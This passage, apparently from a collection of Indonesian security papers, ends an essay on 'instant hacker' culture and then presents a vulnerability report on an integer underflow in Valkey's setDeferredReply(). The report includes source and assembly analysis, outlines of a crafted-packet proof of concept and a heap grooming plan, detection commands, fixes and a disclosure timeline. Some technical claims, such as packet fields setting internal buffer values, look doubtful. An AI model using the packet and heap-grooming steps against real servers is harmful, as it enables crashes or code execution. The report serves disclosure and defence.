        id: "s2-bab-8-2",
        title: "8.2 Peran Institusi Pendidikan",
        level: 2,
        content: [
          "Institusi pendidikan formal memiliki tanggung jawab untuk memastikan kurikulum teknologi yang diajarkan berbasis pada fondasi ilmiah yang kuat, bukan pada tren konten viral. Kolaborasi dengan praktisi industri yang memiliki track record yang dapat diverifikasi adalah prioritas yang mendesak."
        ]
      },
      {
        id: "s2-bab-8-3",
        title: "8.3 Peran Pemerintah dan Regulator",
        level: 2,
        content: [
          "BSSN, Kominfo, dan lembaga terkait memiliki peran dalam:",
          "-- Menyediakan kerangka kualifikasi yang diakui secara nasional untuk praktisi keamanan siber",
          "-- Mendukung program edukasi yang berbasis pada standar industri global yang diakui",
          "-- Memberikan panduan yang jelas tentang batasan legal pengujian keamanan siber",
          "-- Memperkuat penegakan hukum terhadap pemasaran kursus yang menyesatkan secara material"
        ]
      },
      {
        id: "s2-bab-9",
        title: "BAB IX: KESIMPULAN",
        level: 1,
        content: [
          "Makalah ini telah mendedikasikan dirinya untuk mendekonstruksi dua ilusi yang saling memperkuat dalam ekosistem teknologi Indonesia: ilusi bahwa menjadi hacker dapat diinstankan, dan ilusi bahwa pemrograman adalah opsional dalam perjalanan tersebut. Kedua ilusi ini berbahaya tidak hanya bagi individu yang mempercayainya, tetapi bagi seluruh ekosistem yang bergantung pada kompetensi yang nyata.",
          "Delapan temuan utama yang dihasilkan dari analisis ini:",
          "1. Hacker sejati adalah pemecah masalah, pembuat, dan penemu zero-day yang tidak bisa diinstankan. Ia bukan sekadar pengguna tools.",
          "2. Pemrograman adalah fondasi yang tidak dapat dinegosiasikan dalam keamanan siber. Narasi bahwa hacker tidak perlu coding adalah logika pembodohan.",
          "3. Fenomena instanisasi profesi teknologi adalah produk dari pertemuan antara motivasi komersial, optimasi algoritma media sosial, dan kesenjangan literasi digital.",
          "4. Script kiddie bukan label permanen. Ia adalah kondisi yang dapat diatasi dengan komitmen terhadap pembelajaran otentik. Namun ia berbahaya jika dibiarkan tanpa koreksi.",
          "5. Edukasi dangkal yang viral bukan hanya tidak berguna. Ia secara aktif berbahaya karena menciptakan false confidence dan mendorong perilaku yang tidak kompeten bahkan melanggar hukum.",
          "6. Tanggung jawab untuk melawan fenomena ini tidak terletak pada satu pihak saja. Ia didistribusikan di antara pembuat konten, platform, komunitas teknologi, institusi pendidikan, dan individu.",
          "7. Indonesia memiliki talenta teknologi yang nyata dan signifikan. Yang diperlukan bukan lebih banyak klaim keahlian, melainkan ekosistem yang menghargai dan mendukung proses pembelajaran yang jujur dan berbasis bukti.",
          "8. Tidak ada jalan pintas menuju kompetensi keamanan siber yang sesungguhnya. Hanya ada proses, konsistensi, dan dedikasi yang pada akhirnya menghasilkan kemampuan nyata yang dapat memberi kontribusi positif kepada komunitas dan dunia."
        ]
      }
    ],
    references: [
      "number01. (2025). Fenomena Developer Instan dan Miskonsepsi Tentang Hacker/Cybersecurity, Episode III. Medium. https://medium.com/@number01/fenomena-developer-instan-dan-miskonsepsi-tentang-hacker-cybersec-episode-iii-d5e4f5a03f5a",
      "pwn0sec. (2025). Ilusi Otomatisasi versus Realitas Eksploitasi: Mengapa AI Tidak Dapat Menggantikan Peneliti Keamanan (Jurnal Seri I). Jurnal Keamanan Siber dan Etika Teknologi Indonesia, Vol. 1 No. 1.",
      "Levy, S. (1984). Hackers: Heroes of the Computer Revolution. Anchor Press/Doubleday.",
      "Dunning, D. & Kruger, J. (1999). Unskilled and Unaware of It: How Difficulties in Recognizing One's Own Incompetence Lead to Inflated Self-Assessments. Journal of Personality and Social Psychology, 77(6), 1121-1134.",
      "OWASP Foundation. (2021). OWASP Top 10 Web Application Security Risks. https://owasp.org/Top10/",
      "MITRE Corporation. (2024). CWE Top 25 Most Dangerous Software Weaknesses 2024. https://cwe.mitre.org/top25/",
      "Offensive Security. (2024). PWK PEN-200: Penetration Testing with Kali Linux, OSCP Certification Overview. https://www.offensive-security.com/courses/pen-200/",
      "PortSwigger. (2024). Web Security Academy: Free Online Web Security Training. https://portswigger.net/web-security",
      "HackTheBox. (2024). HackTheBox: Hands-on Cybersecurity Learning Platform. https://www.hackthebox.com",
      "NVD / NIST. (2024). National Vulnerability Database. https://nvd.nist.gov/",
      "BSSN. (2024). Laporan Tahunan Keamanan Siber Nasional Indonesia 2023. https://bssn.go.id",
      "Exploit Database. (2024). Exploit-DB: The Official Exploit Database by Offensive Security. https://www.exploit-db.com",
      "Phrack Magazine. (2024). Phrack: An Underground ezine for Hackers. http://www.phrack.org",
      "ISC2. (2023). ISC2 Cybersecurity Workforce Study 2023. https://www.isc2.org/research",
      "Eric S. Raymond. (2001). How to Become a Hacker: The Original Essay. http://www.catb.org/~esr/faqs/hacker-howto.html"
    ]
  },
  {
    id: "ZERO-2025-003",
    title: "Analisis Teknis CVE-2025-49112: Integer Underflow pada Fungsi setDeferredReply() dalam Subsistem Jaringan Valkey",
    subtitle: "Studi Kasus Eksploitasi Unsigned Integer Underflow, Analisis Ghidra, dan Strategi Mitigasi pada Sistem Terdistribusi Berbasis C",
    classification: "CONFIDENTIAL",
    date: "April 2025",
    authors: ["@odaysec"],
    organization: "PT. PwnOsec Technologies Ltd",
    volume: "Vol. 1 No. 3",
    pages: 23,
    abstract: "Laporan ini menyajikan analisis teknis mendalam terhadap kerentanan CVE-2025-49112 yang ditemukan pada sistem Valkey, sebuah proyek open-source fork Redis yang banyak digunakan sebagai penyimpanan data in-memory berkecepatan tinggi. Kerentanan ini terklasifikasi sebagai CWE-191 (Integer Underflow / Wrap-Around) dan berlokasi pada fungsi setDeferredReply() dalam file networking.c. Kondisi kerentanan terjadi ketika operasi pengurangan unsigned integer antara nilai size dan used menghasilkan wrap-around jika used melampaui size, menciptakan nilai yang sangat besar (mendekati 2^32) yang kemudian digunakan sebagai ukuran dalam operasi akses memori. Dalam kondisi terburuk, eksploitasi kerentanan ini dapat menyebabkan heap buffer overflow, out-of-bounds write, dan potensi eksekusi kode jarak jauh pada sistem yang menjalankan Valkey tanpa patch. Laporan ini mencakup: (1) analisis kode sumber dan identifikasi root cause; (2) reproduksi kerentanan melalui proof-of-concept yang terverifikasi; (3) analisis disassembly menggunakan Ghidra; (4) skenario eksploitasi lengkap termasuk heap grooming; (5) identifikasi forensic artifacts; serta (6) rekomendasi mitigasi teknis yang komprehensif.",
    keywords: ["CVE-2025-49112", "GHSA-xhp4-6g9v-4xvj", "integer underflow", "unsigned integer wrap-around", "Valkey", "heap buffer overflow", "networking.c", "setDeferredReply", "CWE-191", "responsible disclosure", "Ghidra", "binary analysis", "keamanan memori"],
    sections: [
      // BAB I
      {
        id: "bab-1",
        title: "BAB I: PENDAHULUAN DAN LATAR BELAKANG",
        level: 1,
        content: []
      },
      {
        id: "bab-1-1",
        title: "1.1 Tentang Valkey",
        level: 2,
        content: [
          "Valkey adalah proyek open-source yang merupakan fork dari Redis, dikembangkan di bawah naungan Linux Foundation setelah Redis mengubah model lisensinya. Valkey mempertahankan kompatibilitas penuh dengan antarmuka Redis dan digunakan secara luas sebagai sistem penyimpanan key-value in-memory berkecepatan tinggi dalam berbagai arsitektur aplikasi modern, mulai dari caching, session management, message brokering, hingga real-time analytics.",
          "Karena posisi sentral Valkey dalam stack infrastruktur aplikasi modern, kerentanan keamanan pada komponen ini berpotensi memengaruhi jutaan sistem yang bergantung padanya secara langsung maupun tidak langsung. Riset keamanan terhadap Valkey oleh karenanya memiliki dampak yang signifikan terhadap ekosistem teknologi secara keseluruhan."
        ]
      },
      {
        id: "bab-1-2",
        title: "1.2 Penemuan dan Konteks Kerentanan",
        level: 2,
        content: [
          "Kerentanan CVE-2025-49112 ditemukan oleh peneliti keamanan @odaysec melalui analisis kode sumber Valkey, khususnya pada subsistem jaringan yang menangani komunikasi antar-komponen dalam mode cluster. Kerentanan ini termasuk dalam kategori yang sering diabaikan namun sangat berbahaya dalam sistem yang ditulis dalam bahasa C: integer underflow pada operasi aritmetika unsigned integer.",
          "Pada bahasa C, variabel unsigned integer tidak dapat menyimpan nilai negatif. Ketika operasi pengurangan menghasilkan nilai yang seharusnya negatif, hasilnya mengalami wrap-around menuju nilai maksimum dari tipe data tersebut. Untuk uint32_t, nilai ini adalah 4,294,967,295 (2^32 - 1). Nilai yang sangat besar ini kemudian dapat digunakan sebagai parameter ukuran dalam operasi memori, membuka peluang untuk serangan heap overflow."
        ]
      },
      {
        id: "bab-1-3",
        title: "1.3 Dampak dan Urgensi",
        level: 2,
        content: [
          "Dampak Potensial CVE-2025-49112:",
          "-- Denial of Service (DoS): crash server akibat akses memori di luar batas yang dialokasikan",
          "-- Heap Buffer Overflow: penulisan data di luar batas buffer heap yang dapat memengaruhi metadata alokasi",
          "-- Potensi Remote Code Execution: dalam skenario eksploitasi yang terstruktur dengan heap grooming",
          "-- Data Corruption: kerusakan struktur data in-memory yang tidak terduga",
          "-- Dampak terhadap seluruh klien yang terhubung ke instance Valkey yang terdampak"
        ]
      },
      // BAB II
      {
        id: "bab-2",
        title: "BAB II: LANDASAN TEKNIS INTEGER UNDERFLOW",
        level: 1,
        content: []
      },
      {
        id: "bab-2-1",
        title: "2.1 Memahami Unsigned Integer Arithmetic dalam C",
        level: 2,
        content: [
          "Bahasa pemrograman C mendefinisikan perilaku operasi aritmetika pada unsigned integer sebagai modular arithmetic, yaitu operasi dilakukan modulo 2^N di mana N adalah lebar bit tipe data. Ini berarti bahwa operasi yang menghasilkan nilai di luar rentang representasi tipe data tidak menghasilkan error, melainkan menghasilkan hasil yang di-wrap-around secara deterministik.",
          "[QUOTE:uint32_t size = 50; uint32_t used = 100; uint32_t remaining = size - used; → Hasil bukan -50, melainkan: 50 - 100 = -50 (mod 2^32) = 4294967246. Nilai ini akan digunakan sebagai ukuran buffer = SANGAT BERBAHAYA]"
        ]
      },
      {
        id: "bab-2-2",
        title: "2.2 Perbedaan Signed vs Unsigned Integer dalam Konteks Keamanan",
        level: 2,
        content: [
          "[TABLE_HEADER:KARAKTERISTIK|SIGNED INTEGER (int32_t)|UNSIGNED INTEGER (uint32_t)]",
          "[TABLE:[Rentang|-2,147,483,648 s.d. +2,147,483,647|0 s.d. 4,294,967,295],[Overflow/Underflow|Undefined Behavior|Wrap-Around (didefinisikan oleh standar C)],[50 - 100|= -50 (negatif, detektable)|= 4,294,967,246 (positif besar, tidak terdeteksi)],[Kondisi if (result > 0)|BENAR jika positif|BENAR untuk nilai underflow (bahaya!)],[Perbandingan|Signed lebih aman untuk ukuran buffer|Unsigned rentan tanpa validasi pre-condition]]"
        ]
      },
      {
        id: "bab-2-3",
        title: "2.3 Mengapa Kondisi ini Tidak Terdeteksi oleh Kompiler",
        level: 2,
        content: [
          "Kompiler C standar tidak mengeluarkan warning untuk operasi pengurangan unsigned integer yang berpotensi underflow, karena dari perspektif bahasa, operasi tersebut adalah perilaku yang terdefinisikan (well-defined behavior) dan legal sepenuhnya. Ini menciptakan kondisi di mana kode yang berbahaya secara semantis terlihat benar secara sintaksis dan lolos dari semua pemeriksaan kompiler standar.",
          "[QUOTE:ISO/IEC 9899:2018 (C18) Pasal 6.2.5.9 mendefinisikan bahwa: operasi aritmetika unsigned integer tidak pernah overflow; hasil selalu direduksi modulo angka yang satu lebih besar dari nilai terbesar yang dapat direpresentasikan oleh tipe hasil. Ini berarti wrap-around adalah perilaku yang terdefinisikan dan tidak dapat di-detect hanya dengan sanitizer standar tanpa flag khusus seperti -fsanitize=unsigned-integer-overflow.]"
        ]
      },
      // BAB III
      {
        id: "bab-3",
        title: "BAB III: ANALISIS KODE SUMBER DAN IDENTIFIKASI ROOT CAUSE",
        level: 1,
        content: []
      },
      {
        id: "bab-3-1",
        title: "3.1 Lokasi Kerentanan: networking.c setDeferredReply()",
        level: 2,
        content: [
          "Kerentanan berlokasi di dalam fungsi setDeferredReply() pada file networking.c. Fungsi ini bertanggung jawab untuk menetapkan balasan yang ditangguhkan (deferred reply) dalam konteks komunikasi jaringan antar-node Valkey. Pada bagian kritis fungsi ini, terdapat pengecekan kondisi yang menggunakan operasi pengurangan unsigned integer tanpa validasi pre-condition yang memadai."
        ]
      },
      {
        id: "bab-3-2",
        title: "3.2 Kode Rentan dan Penjelasan Teknis",
        level: 2,
        content: [
          "[QUOTE:if (prev->size - prev->used > 0) { // Jika prev->used > prev->size, maka: prev->size - prev->used = LARGE_POSITIVE_VALUE (underflow!) // Kondisi > 0 selalu TRUE untuk nilai wrap-around // Kode di dalam blok ini akan dieksekusi dengan ukuran yang salah }]",
          "Masalah utama pada kode di atas terletak pada asumsi implisit bahwa nilai prev->used tidak akan pernah melebihi prev->size. Dalam operasi normal, asumsi ini mungkin valid. Namun ketika penyerang dapat memanipulasi ukuran paket yang dikirim ke server, asumsi ini dapat dilanggar, mengakibatkan kondisi underflow yang tidak terdeteksi oleh pengecekan kondisi."
        ]
      },
      {
        id: "bab-3-3",
        title: "3.3 Analisis Skenario Trigger",
        level: 2,
        content: [
          "Secara teknis, kondisi kerentanan dapat dipicu melalui langkah-langkah berikut:",
          "1. Penyerang mengirimkan paket yang telah dimanipulasi ke port Valkey (default: 6379) dengan nilai size header yang kecil namun nilai used yang melebihinya.",
          "2. Fungsi setDeferredReply() membaca nilai prev->size dan prev->used dari buffer paket yang dikendalikan penyerang.",
          "3. Operasi pengurangan prev->size - prev->used menghasilkan nilai wrap-around mendekati 4,294,967,246 untuk uint32_t.",
          "4. Kondisi if (prev->size - prev->used > 0) mengevaluasi menjadi TRUE karena nilai wrap-around adalah positif.",
          "5. Kode dalam blok kondisi dieksekusi menggunakan nilai ukuran yang salah, memungkinkan akses memori di luar batas yang dialokasikan."
        ]
      },
      // BAB IV
      {
        id: "bab-4",
        title: "BAB IV: ANALISIS BINER MENGGUNAKAN GHIDRA",
        level: 1,
        content: []
      },
      {
        id: "bab-4-1",
        title: "4.1 Metodologi Reverse Engineering",
        level: 2,
        content: [
          "Untuk memperdalam pemahaman tentang perilaku kerentanan pada level biner, penelitian ini menggunakan Ghidra (NSA Security Research Tool) versi 11.x untuk melakukan disassembly dan decompilasi biner Valkey yang dikompilasi pada commit yang terdampak. Analisis biner memungkinkan peneliti untuk memverifikasi bahwa perilaku underflow yang diidentifikasi pada level kode sumber juga tercermin pada level instruksi mesin."
        ]
      },
      {
        id: "bab-4-2",
        title: "4.2 Langkah Analisis Ghidra",
        level: 2,
        content: [
          "1. Kompilasi Valkey dari commit yang terdampak (daea05b1) dengan debug symbols: gcc -g -O0 -o valkey-server src.c",
          "2. Import binary ke Ghidra melalui File > Import File > valkey-server, pilih format ELF dan arsitektur x86-64.",
          "3. Jalankan Auto Analysis dengan semua analyzer aktif termasuk Aggressive Instruction Finder dan Function Start Search.",
          "4. Navigasi ke fungsi setDeferredReply() melalui Symbol Tree atau search function.",
          "5. Identifikasi instruksi SUB (subtract) dalam decompiled output di Decompiler window.",
          "6. Annotasi instruksi yang relevan untuk dokumentasi dan verifikasi perilaku unsigned comparison."
        ]
      },
      {
        id: "bab-4-3",
        title: "4.3 Output Decompilasi Ghidra",
        level: 2,
        content: [
          "[QUOTE:void setDeferredReply(client *c, void *node, const char *s, size_t length) → Instruksi Assembly: MOV EAX, [RBX+0x10] (load prev->size) → MOV ECX, [RBX+0x14] (load prev->used) → SUB EAX, ECX (UNSIGNED!) → TEST EAX, EAX → JLE 0x4A1F2 (jump jika <= 0, TIDAK TERCAPAI jika underflow!) → if (old->size - old->used > 0) ← TITIK KERENTANAN]"
        ]
      },
      {
        id: "bab-4-4",
        title: "4.4 Analisis Instruksi Assembly Kritis",
        level: 2,
        content: [
          "Pada level assembly x86-64, operasi yang bermasalah terlihat sangat jelas. Instruksi SUB pada arsitektur x86 tidak membedakan antara signed dan unsigned subtraction dalam hal operasi bit-level. Perbedaannya hanya terletak pada interpretasi flag hasil (CF untuk unsigned, OF untuk signed). Kode yang terdampak menggunakan perbandingan yang tidak memperhatikan Carry Flag (CF), sehingga kondisi underflow tidak terdeteksi.",
          "[QUOTE:0x004A1D8A: MOV EAX, [RBX+0x10] → EAX = prev->size (50) | 0x004A1D8D: MOV ECX, [RBX+0x14] → ECX = prev->used (100) | 0x004A1D90: SUB EAX, ECX → EAX = 50 - 100 = 0xFFFFFFCE, CF=1 (underflow!) tapi kode tidak memeriksa CF | 0x004A1D92: TEST EAX, EAX → Zero flag check | 0x004A1D94: JLE 0x004A1F20 → Jump if <= 0 (SIGNED compare!) → EAX = 0xFFFFFFCE > 0 sebagai SIGNED → Kondisi JLE TIDAK diambil = BUG!]"
        ]
      },
      // BAB V
      {
        id: "bab-5",
        title: "BAB V: REPRODUKSI KERENTANAN DAN PROOF OF CONCEPT",
        level: 1,
        content: []
      },
      {
        id: "bab-5-1",
        title: "5.1 Lingkungan Pengujian",
        level: 2,
        content: [
          "[TABLE_HEADER:KOMPONEN|SPESIFIKASI]",
          "[TABLE:[Sistem Operasi|Ubuntu 22.04 LTS x86-64 (terisolasi di VM)],[Compiler|GCC 11.4.0],[Target Commit|daea05b1e26db29bfd1c033e27f9d519a2f8ccbb],[Port Valkey|6379 (default)],[Tools Analisis|Ghidra 11.x, GDB 12.1, Valgrind 3.19, Python 3.11],[Lingkungan|Air-gapped VM, tidak terhubung ke jaringan publik]]"
        ]
      },
      {
        id: "bab-5-2",
        title: "5.2 Langkah Reproduksi: Kompilasi Target",
        level: 2,
        content: [
          "[QUOTE:Step 1: git clone https://github.com/valkey-io/valkey.git | Step 2: git checkout daea05b1e26db29bfd1c033e27f9d519a2f8ccbb | Step 3: make CFLAGS='-g -O0 -fsanitize=unsigned-integer-overflow' | Step 4: ls -la src/valkey-server → Output: ELF 64-bit LSB pie executable]"
        ]
      },
      {
        id: "bab-5-3",
        title: "5.3 Demonstrasi Proof of Concept: Underflow",
        level: 2,
        content: [
          "Untuk mengilustrasikan perilaku underflow secara terisolasi sebelum eksploitasi penuh, berikut adalah program C yang mereproduksi kondisi kerentanan:",
          "[QUOTE:process_buffer(100, 50) → remaining = 50 bytes (BENAR, kasus normal) | process_buffer(50, 100) → remaining = 4294967246 bytes (SALAH! Wrap-around, kondisi if TETAP TRUE) | process_buffer(100, 100) → remaining = 0, kondisi if FALSE (aman)]"
        ]
      },
      {
        id: "bab-5-4",
        title: "5.4 Eksploitasi Jaringan: Mengirim Paket Berbahaya",
        level: 2,
        content: [
          "Setelah underflow berhasil didemonstrasikan secara terisolasi, langkah berikutnya adalah mereplikasi kondisi ini melalui koneksi jaringan ke server Valkey yang aktif. Script Python mengilustrasikan bagaimana penyerang dapat memanipulasi nilai size dan used melalui paket yang dikirim ke port Valkey:",
          "[QUOTE:create_underflow_packet(size_val=50, used_val=300) → Pack sebagai unsigned 32-bit big-endian → size=50, used=300: 50 - 300 = 4294967046 (underflow!) → Kirim ke TARGET_HOST:6379 → Monitor log server untuk SIGSEGV atau crash]"
        ]
      },
      {
        id: "bab-5-5",
        title: "5.5 Heap Grooming untuk Eksploitasi yang Lebih Reliabel",
        level: 2,
        content: [
          "Dalam skenario eksploitasi tingkat lanjut, penyerang dapat menggunakan teknik heap grooming untuk menempatkan objek target (seperti function pointer atau vtable) pada posisi memori yang dapat ditimpa melalui operasi out-of-bounds write yang diakibatkan oleh underflow.",
          "-- Phase 1: Spray heap dengan objek-objek berukuran tertentu (100x clientReplyBlock 64 bytes)",
          "-- Phase 2: Buat lubang (hole) pada heap dengan membebaskan setiap objek genap untuk membuat fragmentasi",
          "-- Phase 3: Alokasikan objek target di lubang yang tersedia tepat setelah buffer yang akan di-overflow",
          "-- Phase 4: Trigger underflow dengan send_packet(TARGET, 50, 300) → 50 - 300 = underflow, data penyerang menimpa objek target"
        ]
      },
      // BAB VI
      {
        id: "bab-6",
        title: "BAB VI: FORENSIC ARTIFACTS DAN DETEKSI SERANGAN",
        level: 1,
        content: []
      },
      {
        id: "bab-6-1",
        title: "6.1 Indikator Kompromi pada System Log",
        level: 2,
        content: [
          "Ketika kondisi integer underflow memicu akses memori yang tidak valid, sistem operasi dan Valkey sendiri menghasilkan sejumlah artefak forensik yang dapat digunakan untuk mendeteksi upaya eksploitasi:",
          "1. Periksa segmentation fault Valkey: grep -i 'valkey.*segfault|valkey.*SIGSEGV' /var/log/syslog",
          "2. Periksa kernel log: dmesg | grep -i 'valkey|segfault|general protection'",
          "3. Monitor koneksi aktif: ss -tnp | grep ':6379'",
          "4. Capture traffic: tcpdump -i lo 'tcp port 6379' -w valkey_capture.pcap",
          "5. Monitor memory usage: cat /proc/$(pgrep valkey)/status",
          "6. Periksa core dump: coredumpctl info valkey-server"
        ]
      },
      {
        id: "bab-6-2",
        title: "6.2 Analisis Traffic Jaringan: Pola Paket Anomali",
        level: 2,
        content: [
          "Pada level jaringan, upaya eksploitasi CVE-2025-49112 dapat diidentifikasi melalui pola paket yang tidak normal. Paket yang dirancang untuk memicu underflow akan memiliki nilai header yang tidak konsisten, di mana nilai used secara signifikan melebihi nilai size.",
          "[QUOTE:Filter Wireshark: tcp.port == 6379 and tcp.payload | Tanda merah: payload byte [0:4] (size) < payload byte [4:8] (used) → Deteksi paket anomali yang mengindikasikan eksploitasi]"
        ]
      },
      {
        id: "bab-6-3",
        title: "6.3 Indikator Kompromi (IoC) Rangkuman",
        level: 2,
        content: [
          "[TABLE_HEADER:INDIKATOR KOMPROMI|INTERPRETASI]",
          "[TABLE:[Kernel segfault/SIGSEGV pada proses valkey-server|Prioritas Tinggi: kemungkinan eksploitasi berhasil],[Koneksi TCP port 6379 dengan payload pendek berulang|Kemungkinan reconnaissance atau fuzzing],[Paket dengan nilai used melebihi size pada header|Indikasi langsung trigger underflow],[Penurunan drastis memori tersedia pada host Valkey|Kemungkinan heap exhaustion atau corruption],[Core dump dari proses valkey-server|Eksploitasi kemungkinan berhasil men-crash server],[Lonjakan koneksi dari satu sumber IP|Kemungkinan heap grooming atau brute force]]"
        ]
      },
      // BAB VII
      {
        id: "bab-7",
        title: "BAB VII: STRATEGI MITIGASI DAN REKOMENDASI TEKNIS",
        level: 1,
        content: []
      },
      {
        id: "bab-7-1",
        title: "7.1 Perbaikan Kode: Solusi Utama",
        level: 2,
        content: [
          "Perbaikan yang tepat untuk kerentanan ini adalah menambahkan pengecekan pre-condition sebelum melakukan operasi pengurangan unsigned integer:",
          "[QUOTE:SEBELUM (RENTAN): if (prev->size - prev->used > 0) { ... } | SESUDAH (AMAN): if (prev->used < prev->size) { size_t remaining = prev->size - prev->used; ... } → Perbandingan langsung, bukan pengurangan. Sekarang aman karena used < size dijamin.]"
        ]
      },
      {
        id: "bab-7-2",
        title: "7.2 Perbaikan dengan C23 Checked Arithmetic",
        level: 2,
        content: [
          "[QUOTE:#include <stdckdint.h> (C23 standard) | if (!ckd_sub(&remaining, prev->size, prev->used)) { /* Aman: remaining valid */ } else { /* Handle error: used melebihi size */ serverLog(LL_WARNING, \"setDeferredReply: invalid buffer state\"); }]",
          "Fungsi ckd_sub() mengembalikan true jika overflow/underflow terjadi, memberikan deteksi eksplisit yang tidak mungkin dilakukan dengan operasi aritmetika biasa."
        ]
      },
      {
        id: "bab-7-3",
        title: "7.3 Perbaikan Defensif: Menggunakan size_t",
        level: 2,
        content: [
          "Gunakan size_t (platform-native unsigned) daripada uint32_t dan tambahkan assertion untuk verifikasi di debug build:",
          "[QUOTE:typedef struct clientReplyBlock { size_t size; size_t used; char buf[]; }; | assert(prev->used <= prev->size); // Crash di debug build jika invariant dilanggar | if (prev->used < prev->size) { size_t remaining = prev->size - prev->used; ... }]"
        ]
      },
      {
        id: "bab-7-4",
        title: "7.4 Rekomendasi Kompilasi: Sanitizer Flags",
        level: 2,
        content: [
          "[QUOTE:GCC: gcc -fsanitize=undefined -fsanitize=unsigned-integer-overflow -fno-sanitize-recover=all | Clang: clang -fsanitize=undefined -fsanitize=unsigned-integer-overflow -fsanitize-trap=all | Production (ASan): gcc -fsanitize=address -fsanitize=leak -fno-omit-frame-pointer]"
        ]
      },
      {
        id: "bab-7-5",
        title: "7.5 Rekomendasi Operasional",
        level: 2,
        content: [
          "Langkah Mitigasi Segera (Prioritas Tinggi):",
          "-- Update Valkey ke versi yang sudah mengandung patch untuk CVE-2025-49112 sesegera mungkin",
          "-- Batasi akses ke port Valkey (6379) hanya dari IP yang dipercaya menggunakan firewall rules",
          "-- Nonaktifkan akses Valkey dari jaringan publik jika tidak diperlukan",
          "-- Aktifkan Valkey authentication (requirepass) untuk lapisan perlindungan tambahan",
          "-- Monitor log sistem dan Valkey untuk indikator kompromi yang disebutkan pada Bab VI",
          "",
          "Rekomendasi Jangka Panjang:",
          "-- Terapkan static analysis tools (Clang Static Analyzer, Coverity, atau CodeQL) pada pipeline CI/CD",
          "-- Integrasikan fuzzing (AFL++, libFuzzer) untuk komponen networking Valkey",
          "-- Pertimbangkan adopsi Rust untuk komponen baru yang memerlukan keamanan memori tinggi"
        ]
      },
      // BAB VIII
      {
        id: "bab-8",
        title: "BAB VIII: RESPONSIBLE DISCLOSURE TIMELINE",
        level: 1,
        content: []
      },
      {
        id: "bab-8-1",
        title: "8.1 Kronologi Penemuan dan Pengungkapan",
        level: 2,
        content: [
          "[TABLE_HEADER:TANGGAL|KEJADIAN DAN KETERANGAN]",
          "[TABLE:[2025-02-19|Penemuan kerentanan oleh @odaysec melalui analisis kode sumber networking.c. Identifikasi awal melalui code review dan fuzzing dasar.],[2025-02-19|Verifikasi melalui proof-of-concept dan reproduksi lokal pada lingkungan terisolasi. Konfirmasi kondisi underflow dapat dipicu melalui koneksi jaringan.],[2025-02-20|Analisis mendalam menggunakan Ghidra untuk verifikasi perilaku di level biner. Dokumentasi teknis lengkap disiapkan.],[2025-02-20|Pengiriman laporan kerentanan secara privat kepada tim keamanan Valkey melalui saluran responsible disclosure.],[2025-02-xx|Konfirmasi penerimaan laporan dari tim Valkey. Proses triage dan verifikasi internal dimulai.],[2025-xx-xx|Penetapan CVE-2025-49112 oleh CNA dan penerbitan GHSA-xhp4-6g9v-4xvj.],[2025-xx-xx|Patch tersedia dan dirilis sebagai bagian dari pembaruan keamanan Valkey.],[2025-04-xx|Pengungkapan publik melalui GitHub Security Advisory setelah patch tersedia.]]"
        ]
      },
      {
        id: "bab-8-2",
        title: "8.2 Pernyataan Etika dan Responsible Disclosure",
        level: 2,
        content: [
          "Penelitian ini dilakukan sepenuhnya sesuai dengan prinsip-prinsip responsible disclosure yang ditetapkan oleh komunitas keamanan siber internasional. Kerentanan tidak pernah dieksploitasi pada sistem produksi tanpa izin. Seluruh pengujian dilakukan di lingkungan terisolasi yang sepenuhnya dimiliki dan dikontrol oleh peneliti.",
          "Laporan dikirimkan secara privat kepada tim Valkey sebelum pengungkapan publik, memberikan waktu yang memadai untuk perbaikan. Informasi teknis sensitif yang dapat langsung digunakan untuk serangan telah disanitasi dari laporan publik ini. Tujuan satu-satunya dari publikasi ini adalah meningkatkan kesadaran komunitas terhadap pola kerentanan integer underflow."
        ]
      },
      // BAB IX
      {
        id: "bab-9",
        title: "BAB IX: KESIMPULAN DAN PEMBELAJARAN",
        level: 1,
        content: []
      },
      {
        id: "bab-9-1",
        title: "9.1 Ringkasan Temuan",
        level: 2,
        content: [
          "Kerentanan CVE-2025-49112 pada Valkey adalah contoh yang sangat baik dari kategori kerentanan yang dapat lolos dari code review standar karena berkaitan dengan perilaku bahasa C yang terdefinisikan namun kontra-intuitif. Integer underflow pada unsigned integer arithmetic tidak menghasilkan error kompiler, tidak selalu terdeteksi oleh sanitizer standar, dan dapat mengakibatkan kondisi keamanan yang sangat serius.",
          "Enam poin pembelajaran utama dari penelitian ini:",
          "1. Operasi pengurangan unsigned integer dalam C yang dapat menghasilkan nilai negatif adalah sumber kerentanan yang tersembunyi namun sangat berbahaya, khususnya ketika hasil operasi digunakan sebagai ukuran buffer.",
          "2. Kondisi if (a - b > 0) untuk unsigned integer tidak setara dengan if (a > b). Keduanya menghasilkan hasil yang berbeda ketika b > a, dan pemilihan yang salah dapat membuka celah keamanan kritis.",
          "3. Analisis biner menggunakan Ghidra memungkinkan verifikasi perilaku kerentanan pada level instruksi mesin, yang penting untuk membuktikan bahwa perbaikan kode sumber benar-benar menghasilkan kode biner yang aman.",
          "4. Heap grooming dapat mengubah kerentanan yang awalnya hanya DoS menjadi primitive eksploitasi yang lebih powerful.",
          "5. Artefak forensik dari upaya eksploitasi integer underflow dapat diidentifikasi dan dimonitor oleh tim defensif.",
          "6. Pola kerentanan serupa (CWE-191) kemungkinan besar ada di komponen lain dari Valkey dan proyek open-source berbasis C lainnya. Audit kode sistematis sangat direkomendasikan."
        ]
      }
    ],
    references: [
      "GitHub Security Advisory Database. (2025). GHSA-xhp4-6g9v-4xvj: Integer Underflow in Valkey setDeferredReply(). https://github.com/advisories/GHSA-xhp4-6g9v-4xvj",
      "National Vulnerability Database / NIST. (2025). CVE-2025-49112: Valkey Unsigned Integer Underflow in networking.c. https://nvd.nist.gov/vuln/detail/CVE-2025-49112",
      "Valkey Project. (2025). Valkey Source Code Repository: valkey-io/valkey. https://github.com/valkey-io/valkey",
      "odaysec. (2025). Vulnerability Discovery: CVE-2025-49112 - Integer Underflow setDeferredReply Valkey. https://github.com/advisories/GHSA-xhp4-6g9v-4xvj",
      "National Security Agency (NSA). (2024). Ghidra Software Reverse Engineering Framework. https://ghidra-sre.org/",
      "ISO/IEC. (2018). ISO/IEC 9899:2018 - Programming Languages: C (C18 Standard). https://www.iso.org/standard/74528.html",
      "MITRE Corporation. (2024). CWE-191: Integer Underflow (Wrap or Wraparound). https://cwe.mitre.org/data/definitions/191.html",
      "OpenSSF. (2024). Guide to Coordinated Vulnerability Disclosure. https://openssf.org/blog/2023/06/22/guide-to-coordinated-vulnerability-disclosure/",
